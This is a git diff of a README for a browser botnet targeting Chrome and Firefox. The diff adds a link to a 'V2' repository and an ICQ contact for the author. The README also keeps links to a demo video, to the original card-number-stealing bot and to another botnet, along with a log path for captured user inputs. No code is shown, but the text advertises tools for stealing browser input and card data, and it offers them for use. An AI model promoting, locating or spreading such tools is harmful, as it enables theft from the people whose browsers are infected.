@@ -39,7 +39,12 @@ http://127.0.0.1/bot/logs/127.0.0.1-inputs.txt
 
 
 
-# Demo video Youtube
+# Demo video Youtube and New Version
+
+# New Version
+https://github.com/hakanonymos/botnet-browser-chrome-firefox-V2
+
+Demo Version of this Project
 
 https://www.youtube.com/watch?v=65ORpeeGWps&feature=youtu.be
 
@@ -48,6 +53,7 @@ https://www.youtube.com/watch?v=65ORpeeGWps&feature=youtu.be
 https://www.instagram.com/hakanonymos
 
 hakanonymos@hotmail.com
+ICQ : hakanonymos
 
 # Original project
 my bot Card number
@@ -55,7 +61,7 @@ https://github.com/hakanonymos/botnet-browser-chrome
 
 Cloud 9 botnet
 https://github.com/Antonio24/Cloud9
- this project has a probleme, i have fixed some probleme 
+ 
 
 
 
